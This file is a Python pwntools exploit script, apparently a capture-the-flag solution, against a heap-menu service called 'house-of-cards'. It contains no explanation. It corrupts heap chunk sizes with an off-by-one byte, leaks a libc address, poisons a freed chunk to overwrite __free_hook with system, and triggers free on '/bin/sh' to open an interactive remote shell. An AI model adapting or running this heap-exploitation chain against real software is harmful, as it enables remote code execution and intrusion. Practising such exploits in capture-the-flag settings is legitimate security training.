#!/usr/bin/python
from pwn import *
from time import sleep

context.log_level = "error"
context.terminal = ['gnome-terminal', '--', 'sh', '-c']
#context.terminal = ['tmux', 'splitw', '-hp', '60']
#context.terminal = ["alacritty", "-e", "sh", "-c"]
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./bin/libc.so.6")
#elf = ELF("./run")
#p = gdb.debug(elf.path, "c")
#p = process(elf.path)

def alloc(ind=0):
    p.sendlineafter(b"Action: ", b"1")
    p.sendlineafter(b"index: ", str(ind).encode())
    p.recvuntil(b"drawn: ")
    return int(p.recv(1))

def free(ind):
    p.sendlineafter(b"Action: ", b"2")
    p.sendlineafter(b"index: ", str(ind).encode())

def edit(ind, data):
    p.sendlineafter(b"Action: ", b"3")
    p.sendlineafter(b"index: ", str(ind).encode())
    p.sendafter(b"data: ", data)

def show(ind):
    p.sendlineafter(b"Action:", b"4")
    p.sendlineafter(b"index: ", str(ind).encode())

sleeptime = 0.2
tries_list = []
tries = 0
host = "house-of-cards.h4ck1ng.org"
port = 80
while True:
    sleep(sleeptime)
    tries += 1
    #p = process(elf.path)
    p = remote(host, port)

    rchunks = []
    vchunks = []
    for i in range(8):
        rchunks.append(alloc(i))
        vchunks.append(alloc(10 + i))

    rchunks.append(alloc(8))

    if rchunks[8] not in rchunks[:7]:
        print(f"[*] Run {tries} was unlucky. Retrying.")
        p.close()
        continue

    for i in range(7):
        edit(i, p64(0x21)*((rchunks[i] * 0x10 + 0xf8) // 8) + b"\xf1")
        free(10+i)

    edit(7, p64(0x21)*((rchunks[7] * 0x10 + 0xf8) // 8) + b"\xf1")
    edit(8, p64(0x21)*((rchunks[7] * 0x10 + 0xf8) // 8))

    free(10+7)
    news = alloc(20)
    if news - vchunks[7] <= 1:
        print(f"[*] Run {tries} was unlucky. Retrying.")
        p.close()
        continue

    show(20)

    p.recvline()
    libc_leak = p.recv(8)
    libc.address = u64(libc_leak) - 0x3b5dc0

    for i in range(8):
        if rchunks[i] == rchunks[8]:
            free(i)
            break

    free(8)
    edit(20, b"\x00"*(0xf8 + vchunks[7] * 0x10) + p64(0x101 + rchunks[8] * 0x10) + p64(libc.sym.__free_hook - 8))

    first = False
    for i in range(30, 54):
        if alloc(i) == rchunks[8]:
            if not first:
                first = True
            else:
                edit(i, b"/bin/sh\x00" + p64(libc.sym.system))
                break

    free(i)

    tries_list.append(tries)

    #log.info(hex(libc.address))
    p.interactive()
    p.close()
    break
